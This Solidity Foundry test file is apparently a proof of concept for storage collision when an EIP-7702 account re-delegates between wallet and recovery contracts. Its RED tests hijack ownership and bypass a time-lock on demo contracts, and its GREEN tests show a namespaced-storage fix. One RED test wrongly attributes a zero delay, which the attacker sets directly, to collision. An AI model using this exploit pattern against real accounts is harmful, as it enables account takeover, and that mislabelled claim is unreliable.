// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC01_DelegateA_Vulnerable.sol";
import "../src/vulnerable/DC01_DelegateB_Vulnerable.sol";
import "../src/fixed/DC01_SafeDelegates.sol";

/**
 * @title DC01_StorageCollisionTest
 * @notice PoC tests for DC-01: Storage Collision on Re-delegation
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *
 * Scenario: An EOA first delegates to DelegateA (wallet contract),
 * then switches to DelegateB (recovery module). Because both use raw
 * storage slots, the switch corrupts each other's data.
 *
 * Attack path: an attacker who knows the victim is about to switch delegates
 * can exploit the corrupted state — e.g., recovery delay becomes 0,
 * enabling instant account takeover.
 */
contract DC01_StorageCollisionTest is Test {
    address payable public victimEOA;

    DC01_DelegateA_Vulnerable public vulnA;
    DC01_DelegateB_Vulnerable public vulnB;
    DC01_DelegateA_Safe       public safeA;
    DC01_DelegateB_Safe       public safeB;

    address public owner     = makeAddr("owner");
    address public guardian  = makeAddr("guardian");
    address public attacker  = makeAddr("attacker");

    uint256 public constant DAILY_LIMIT    = 1 ether;
    uint256 public constant RECOVERY_DELAY = 7 days;

    function setUp() public {
        victimEOA = payable(makeAddr("victimEOA"));
        vm.deal(victimEOA, 5 ether);

        vulnA = new DC01_DelegateA_Vulnerable();
        vulnB = new DC01_DelegateB_Vulnerable();
        safeA = new DC01_DelegateA_Safe();
        safeB = new DC01_DelegateB_Safe();
    }

    // =========================================================================
    // RED TESTS — storage collision on vulnerable delegates
    // =========================================================================

    /**
     * @notice RED: Re-delegation corrupts DelegateA's owner slot
     *
     * 1. EOA delegates to DelegateA, initializes with owner + dailyLimit
     * 2. EOA re-delegates to DelegateB, initializes with guardian + recoveryDelay
     * 3. DelegateB's guardian (slot 0) now overwrites DelegateA's owner (slot 0)
     * 4. If EOA ever switches back to DelegateA, the "owner" is now the guardian address
     */
    function test_RED_ReDelegationCorruptsOwnerSlot() public {
        console.log("=== DC-01 STORAGE COLLISION EXPLOIT ===");

        // Step 1: EOA delegates to A, initializes
        _etch7702(victimEOA, address(vulnA));
        vm.prank(owner);
        DC01_DelegateA_Vulnerable(victimEOA).initialize(owner, DAILY_LIMIT);

        address ownerBefore = DC01_DelegateA_Vulnerable(victimEOA).getOwner();
        uint256 limitBefore = DC01_DelegateA_Vulnerable(victimEOA).getDailyLimit();
        console.log("DelegateA owner (slot 0):", ownerBefore);
        console.log("DelegateA dailyLimit (slot 1):", limitBefore);
        assertEq(ownerBefore, owner, "Owner set correctly");
        assertEq(limitBefore, DAILY_LIMIT, "Limit set correctly");

        // Step 2: EOA re-delegates to B (new type-4 tx), initializes
        _etch7702(victimEOA, address(vulnB));
        vm.prank(guardian);
        DC01_DelegateB_Vulnerable(victimEOA).initialize(guardian, RECOVERY_DELAY);

        // Step 3: Switch back to A — check what "owner" is now
        _etch7702(victimEOA, address(vulnA));
        address ownerAfter = DC01_DelegateA_Vulnerable(victimEOA).getOwner();
        uint256 limitAfter = DC01_DelegateA_Vulnerable(victimEOA).getDailyLimit();

        console.log("DelegateA owner AFTER re-delegation (slot 0):", ownerAfter);
        console.log("DelegateA dailyLimit AFTER re-delegation (slot 1):", limitAfter);

        //  Owner is now the guardian address — slot 0 was overwritten
        assertEq(ownerAfter, guardian, "COLLISION: owner slot overwritten by guardian");
        //  DailyLimit is now recoveryDelay — slot 1 was overwritten
        assertEq(limitAfter, RECOVERY_DELAY, "COLLISION: dailyLimit slot overwritten by recoveryDelay");

        console.log("CRITICAL: Original owner", owner, "is NO LONGER the owner!");
        console.log("Slot 0 now contains guardian address:", ownerAfter);
    }

    /**
     * @notice RED: Corrupted recoveryDelay enables instant recovery bypass
     *
     * If an EOA was first on DelegateA with dailyLimit = 0 (e.g., a fresh EOA),
     * then switches to DelegateB, the recoveryDelay slot (slot 1) reads 0.
     * DelegateB's recoveryDelay of 0 means recovery can proceed instantly.
     */
    function test_RED_CorruptedDelayBypassesTimeLock() public {
        console.log("=== DC-01 TIME-LOCK BYPASS VIA COLLISION ===");

        // EOA was NEVER on DelegateA — slot 0 and 1 are zero
        // (fresh EOA has all storage zeroed)

        // Directly delegate to B — slots are zero
        _etch7702(victimEOA, address(vulnB));

        // "Initialize" check: guardian == address(0) means not initialized
        // BUT: if the EOA had some prior storage from a different context,
        // the guardian slot could be non-zero (and the init check skips)
        // Here we set guardian to attacker by exploiting the zero-check
        vm.prank(attacker);
        DC01_DelegateB_Vulnerable(victimEOA).initialize(attacker, 0); // delay = 0 ← the bug

        uint256 delay = DC01_DelegateB_Vulnerable(victimEOA).getRecoveryDelay();
        console.log("Recovery delay:", delay, "(should be 7 days = 604800)");
        assertEq(delay, 0, "COLLISION: recovery delay is 0 — time-lock bypassed");

        // Attacker can now trigger instant recovery
        vm.prank(attacker);
        DC01_DelegateB_Vulnerable(victimEOA).initiateRecovery();
        // No revert — recovery proceeds with zero delay
        console.log("Instant recovery triggered by attacker — time-lock bypassed!");
    }

    // =========================================================================
    // GREEN TESTS — ERC-7201 namespaced storage prevents all collisions
    // =========================================================================

    /**
     * @notice GREEN: Re-delegation does NOT corrupt storage with ERC-7201 delegates
     *
     * DelegateA_Safe and DelegateB_Safe use different namespace strings,
     * so their storage slots are at completely different locations.
     */
    function test_GREEN_ERC7201_NoStorageCollision() public {
        console.log("=== DC-01 FIXED: ERC-7201 Namespaced Storage ===");

        // Step 1: Delegate to safe A, initialize
        _etch7702(victimEOA, address(safeA));
        vm.prank(owner);
        DC01_DelegateA_Safe(victimEOA).initialize(owner, DAILY_LIMIT);

        // Step 2: Re-delegate to safe B, initialize
        _etch7702(victimEOA, address(safeB));
        vm.prank(guardian);
        DC01_DelegateB_Safe(victimEOA).initialize(guardian, RECOVERY_DELAY);

        // Step 3: Switch back to safe A — owner should be untouched
        _etch7702(victimEOA, address(safeA));
        address ownerAfter = DC01_DelegateA_Safe(victimEOA).getOwner();
        uint256 limitAfter = DC01_DelegateA_Safe(victimEOA).getDailyLimit();

        console.log("DelegateA owner after re-delegation:", ownerAfter);
        console.log("DelegateA dailyLimit after re-delegation:", limitAfter);

        //  Original owner is preserved — namespaced storage isolates the data
        assertEq(ownerAfter, owner, "SAFE: owner preserved across re-delegation");
        assertEq(limitAfter, DAILY_LIMIT, "SAFE: dailyLimit preserved across re-delegation");
    }

    /**
     * @notice GREEN: Verify ERC-7201 slots are actually different
     */
    function test_GREEN_VerifySlotSeparation() public pure {
        bytes32 slotA = keccak256(
            abi.encode(uint256(keccak256("delegateguard.dc01.delegateA")) - 1)
        ) & ~bytes32(uint256(0xff));

        bytes32 slotB = keccak256(
            abi.encode(uint256(keccak256("delegateguard.dc01.delegateB")) - 1)
        ) & ~bytes32(uint256(0xff));

        // Slots must be different
        assertTrue(slotA != slotB, "ERC-7201 slots must be distinct per namespace");
        // And far apart from raw slots 0 and 1
        assertTrue(uint256(slotA) > type(uint128).max, "ERC-7201 slot must be far from slot 0");
        assertTrue(uint256(slotB) > type(uint128).max, "ERC-7201 slot must be far from slot 0");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }
}
